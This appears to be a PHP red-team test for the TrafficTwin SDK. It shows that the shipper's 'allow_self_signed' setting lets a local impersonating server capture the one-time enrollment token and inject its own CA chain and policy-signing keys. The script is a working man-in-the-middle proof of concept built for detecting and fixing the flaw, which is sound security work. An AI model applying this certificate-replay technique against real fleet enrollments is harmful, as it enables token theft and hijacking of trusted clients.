<?php

declare(strict_types=1);

/**
 * RT-PHP-1 (critical): the PHP shipper accepts ANY self-signed server certificate, so the CA pin
 * of the enrollment token and the mTLS trust anchor are bypassed by a network MITM.
 *
 * sdk/php/src/Shipper/Http.php sets `allow_self_signed => true` in the stream context of every
 * Fleet call (enrollment POST, heartbeat, policy, renew, intake). In PHP's OpenSSL wrapper that
 * option turns X509_V_ERR_DEPTH_ZERO_SELF_SIGNED_CERT into success regardless of `cafile`: a
 * self-signed leaf whose CN/SAN matches the host passes. Fleet::enroll first fetches the pinned
 * root (a public certificate the attacker can replay in its own chain), then sends the token over
 * a second connection that trusts that root... and any self-signed leaf.
 *
 * Result: the attacker receives the one-time enrollment token and answers with its own
 * ca_chain (pinned root + attacker CA) and its own policy_signing_keys. The source then trusts
 * the attacker as tt-core for good and accepts policies the attacker signs (keep on any field):
 * real values leave zone A.
 *
 * Run (exit 1 = vulnerable, 0 = fixed):
 *   docker run --rm -v "$PWD":/repo:ro -w /repo php:8.3-cli php test/redteam/php/tls_mitm_test.php
 *
 * Invented data only; the attacker server runs on 127.0.0.1 inside the container.
 */

require __DIR__ . '/../../../sdk/php/src/autoload.php';

use TrafficTwin\Sanitizer\Utf8;
use TrafficTwin\Shipper\Fleet;
use TrafficTwin\Shipper\FleetError;
use TrafficTwin\Shipper\Http;
use TrafficTwin\State\Store;

$dir = sys_get_temp_dir() . '/tt-rt-mitm-' . bin2hex(random_bytes(4));
mkdir($dir, 0700, true);
$cnf = $dir . '/openssl.cnf';
file_put_contents($cnf, <<<'CNF'
[req]
default_bits = 2048
distinguished_name = dn
prompt = no
[dn]
CN = x
[v3_ca]
basicConstraints = critical,CA:TRUE
keyUsage = critical,keyCertSign,cRLSign
[v3_leaf]
basicConstraints = CA:FALSE
subjectAltName = DNS:localhost,IP:127.0.0.1
keyUsage = digitalSignature
extendedKeyUsage = serverAuth
CNF);
$key = static fn () => openssl_pkey_new(['private_key_type' => OPENSSL_KEYTYPE_EC, 'curve_name' => 'prime256v1', 'config' => $cnf]);

// The REAL Fleet CA root: its private key never reaches the attacker, its certificate is public.
$rootKey = $key();
$root = openssl_csr_sign(openssl_csr_new(['commonName' => 'tt-fleet-root'], $rootKey, ['config' => $cnf]), null, $rootKey, 30,
    ['digest_alg' => 'sha256', 'config' => $cnf, 'x509_extensions' => 'v3_ca'], 1);
openssl_x509_export($root, $rootPem);
$rootDer = base64_decode(preg_replace('/-----[A-Z ]+-----|\s+/', '', $rootPem));
$pin = Utf8::b64url(hash('sha256', $rootDer, true));
$token = 'tte_' . Utf8::b64url(random_bytes(24)) . '.' . $pin;
file_put_contents($dir . '/root.pem', $rootPem);

// The attacker: a self-signed leaf for localhost, plus the public root replayed in the chain.
$leafKey = $key();
$leaf = openssl_csr_sign(openssl_csr_new(['commonName' => 'localhost'], $leafKey, ['config' => $cnf]), null, $leafKey, 30,
    ['digest_alg' => 'sha256', 'config' => $cnf, 'x509_extensions' => 'v3_leaf'], 7);
openssl_x509_export($leaf, $leafPem);
openssl_pkey_export($leafKey, $leafKeyPem, null, ['config' => $cnf]);
file_put_contents($dir . '/chain.pem', $leafPem . $rootPem);
file_put_contents($dir . '/leaf.key', $leafKeyPem);
$attackerSign = Utf8::b64url(sodium_crypto_sign_publickey(sodium_crypto_sign_keypair()));

// Start the server on an ephemeral port, then write the answer that points back to it.
file_put_contents($dir . '/answer.json', '{}');
$proc = proc_open([PHP_BINARY, __DIR__ . '/mitm_server.php', $dir], [0 => ['file', '/dev/null', 'r'], 1 => ['file', $dir . '/srv.out', 'w'], 2 => ['file', $dir . '/srv.out', 'a']], $pipes);
for ($i = 0; $i < 100 && !is_file($dir . '/port'); $i++) {
    usleep(50000);
}
$port = (int) @file_get_contents($dir . '/port');
if ($port === 0) {
    fwrite(STDERR, "attacker server did not start\n" . @file_get_contents($dir . '/srv.out'));
    exit(2);
}
$base = 'https://localhost:' . $port;
file_put_contents($dir . '/answer.json', json_encode([
    'source_id' => 'src-attacker01', 'group' => 'demo', 'service_name' => 'shop-api',
    'client_cert' => $leafPem, 'ca_chain' => $rootPem . $leafPem,
    'policy_signing_keys' => [['kid' => 'attacker-1', 'alg' => 'Ed25519', 'public_key' => $attackerSign]],
    'intake_url' => $base, 'fleet_url' => $base,
], JSON_UNESCAPED_SLASHES));

$fail = 0;

// A. One Fleet call trusting only the real root: must fail the TLS verification.
try {
    $r = Http::request('GET', $base . '/fleet/v1/policy', [], null, ['cafile' => $dir . '/root.pem'], 5);
    echo "VULNERABLE A: Http::request accepted a self-signed leaf not issued by the trusted root (HTTP {$r['status']})\n";
    $fail = 1;
} catch (FleetError $e) {
    echo "ok A: Http::request refused the attacker certificate ({$e->getMessage()})\n";
}

// B. Full enrollment against the attacker, with a token pinned to the REAL root.
$store = new Store($dir . '/state');
try {
    $res = Fleet::enroll($base, $token, ['kind' => 'sdk-php', 'version' => '0.0.0', 'service_name' => 'shop-api'], true, $store, 5);
    $leaked = str_contains((string) @file_get_contents($dir . '/requests.log'), $token);
    echo 'VULNERABLE B: enrolled with the attacker; pinned signing keys now ' . json_encode($res['enrollment']['policy_signing_keys'])
        . ($leaked ? '; the one-time enrollment token was sent to the attacker' : '') . "\n";
    $fail = 1;
} catch (FleetError $e) {
    echo "ok B: enrollment refused ({$e->getMessage()})\n";
}

// Control: the same call without allow_self_signed is refused (this is the fix).
$ctx = stream_context_create(['ssl' => ['verify_peer' => true, 'verify_peer_name' => true, 'cafile' => $dir . '/root.pem', 'peer_name' => 'localhost']]);
$fp = @stream_socket_client('ssl://localhost:' . $port, $en, $es, 5, STREAM_CLIENT_CONNECT, $ctx);
echo $fp === false ? "control: without allow_self_signed the attacker is refused\n" : "control: UNEXPECTED, attacker accepted even without allow_self_signed\n";

proc_terminate($proc, 9);
exec('rm -rf ' . escapeshellarg($dir));
exit($fail);
